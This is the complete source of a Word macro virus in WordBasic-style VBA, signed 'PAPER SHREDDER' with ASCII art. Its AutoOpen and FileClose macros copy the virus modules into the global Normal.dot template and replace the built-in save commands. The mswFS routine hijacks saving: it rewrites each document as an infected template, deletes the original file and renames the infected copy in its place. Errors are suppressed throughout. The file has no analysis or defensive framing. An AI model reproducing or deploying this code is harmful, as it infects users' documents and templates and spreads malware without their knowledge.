   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   Rem    PAPER SHREDDER   (c) Sirius (alpha CMa), Sirius B White Dwarf
   Rem
   Rem                                          999999
   Rem                                         999999999
   Rem                                        999999999999
   Rem                                        99999999999999
   Rem                                          999999 999999
   Rem                                       999999999 99999999
   Rem                                  @99999999999999   99999
   Rem                                  999999999999999      99
   Rem                   99999           9999999999 9999       9
   Rem                 99999999            9999999   999
   Rem                9999 999999          99999      999
   Rem               9999   9999999      999999        99
   Rem              999       9999999   999999         99
   Rem   99        999         99999999999999999       99
   Rem   99      99999999999999999999999999999999      99
   Rem   999999999999999999999999999999999999999       9999
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim TemplatePath$
   Dim WorkDirPath$
   Dim NormalPath$
   Dim CurrentFile$
   On Error Resume Next
   TemplatePath$ = WordBasic.[DefaultDir$](2)
   WorkDirPath$ = WordBasic.[DefaultDir$](0)
   NormalPath$ = TemplatePath$ + "\Normal.dot"
   CurrentFile$ = WordBasic.[FileNameFromWindow$]()


   WordBasic.Organizer Copy:=1, Source:=CurrentFile$, Destination:=NormalPath$, Name:="mswFS", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrentFile$, Destination:=NormalPath$, Name:="FileClose", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrentFile$, Destination:=NormalPath$, Name:="AutoOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrentFile$, Destination:=NormalPath$, Name:="AutoExec", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrentFile$, Destination:=NormalPath$, Name:="ToolsMacro", Tab:=3

   WordBasic.ToolsMacro Name:="FileSave", Show:=1, Delete:=1
   WordBasic.ToolsMacro Name:="mswFC", Show:=1, Delete:=1
   WordBasic.ToolsMacro Name:="mswAO", Show:=1, Delete:=1

   WordBasic.Organizer Rename:=1, Source:=NormalPath$, Name:="mswFS", NewName:="FileSave", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=NormalPath$, Name:="FileClose", NewName:="mswFC", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=NormalPath$, Name:="AutoOpen", NewName:="mswAO", Tab:=3

   Err.Number = 0
   End Sub

   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Dim TemplatePath$
   Dim WorkDirPath$
   Dim NormalPath$
   Dim CurrentFile$
   On Error Resume Next
   TemplatePath$ = WordBasic.[DefaultDir$](2)
   WorkDirPath$ = WordBasic.[DefaultDir$](0)
   NormalPath$ = TemplatePath$ + "\Normal.dot"
   CurrentFile$ = WordBasic.[FileNameFromWindow$]()


   WordBasic.Organizer Copy:=1, Source:=CurrentFile$, Destination:=NormalPath$, Name:="mswFS", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrentFile$, Destination:=NormalPath$, Name:="FileClose", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrentFile$, Destination:=NormalPath$, Name:="AutoOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrentFile$, Destination:=NormalPath$, Name:="AutoExec", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrentFile$, Destination:=NormalPath$, Name:="ToolsMacro", Tab:=3

   WordBasic.ToolsMacro Name:="FileSave", Show:=1, Delete:=1
   WordBasic.ToolsMacro Name:="mswFC", Show:=1, Delete:=1
   WordBasic.ToolsMacro Name:="mswAO", Show:=1, Delete:=1

   WordBasic.Organizer Rename:=1, Source:=NormalPath$, Name:="mswFS", NewName:="FileSave", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=NormalPath$, Name:="FileClose", NewName:="mswFC", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=NormalPath$, Name:="AutoOpen", NewName:="mswAO", Tab:=3

   Err.Number = 0

   WordBasic.FileClose
   End Sub

   Attribute VB_Name = "mswFS"

   Public Sub MAIN()
   Dim TemplatePath$
   Dim WorkDirPath$
   Dim CurrentFile$
   Dim OriginalFile$
   Dim Signature$
   Dim SignatureTest$
   Dim NormalPath$
   Dim CurrentFileNoExt$
   Dim TargetFile$
   On Error GoTo -1: On Error GoTo BYE
   WordBasic.FileSave
   On Error GoTo -1: On Error GoTo BYE
   TemplatePath$ = WordBasic.[DefaultDir$](2)
   WorkDirPath$ = WordBasic.[DefaultDir$](0)
   CurrentFile$ = WordBasic.[FileNameFromWindow$]()
   OriginalFile$ = WordBasic.[FileName$]()
   Signature$ = "mswFS"
   SignatureTest$ = UCase(WordBasic.[MacroFileName$](Signature$))
   If SignatureTest$ = UCase(WordBasic.[FileNameFromWindow$]()) Then
   GoTo BYE
   Else
   GoTo CONTINUEON
   End If
   CONTINUEON:
   WordBasic.ToolsOptionsGeneral RecentFiles:=0

   NormalPath$ = TemplatePath$ + "\Normal.dot"
   CurrentFileNoExt$ = WordBasic.[FileNameInfo$](WordBasic.[FileNameFromWindow$](), 4)
   TargetFile$ = TemplatePath$ + "\" + CurrentFileNoExt$ + ".dot"

   WordBasic.FileSaveAs Name:=TargetFile$, Format:=1, AddToMru:=0

   WordBasic.Organizer Copy:=1, Source:=NormalPath$, Destination:=TargetFile$, Name:="AutoExec", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=NormalPath$, Destination:=TargetFile$, Name:="ToolsMacro", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=NormalPath$, Destination:=TargetFile$, Name:="FileSave", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=TargetFile$, Name:="FileSave", NewName:="mswFS", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=NormalPath$, Destination:=TargetFile$, Name:="mswAO", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=TargetFile$, Name:="mswAO", NewName:="AutoOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=NormalPath$, Destination:=TargetFile$, Name:="mswFC", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=TargetFile$, Name:="mswFC", NewName:="FileClose", Tab:=3

   WordBasic.FileSave

   WordBasic.FileClose

   WordBasic.Kill OriginalFile$
   WordBasic.Rename TargetFile$, OriginalFile$
   WordBasic.DisableAutoMacros (1)
   WordBasic.FileOpen Name:=OriginalFile$
   WordBasic.DisableAutoMacros (0)

   BYE:
   End Sub
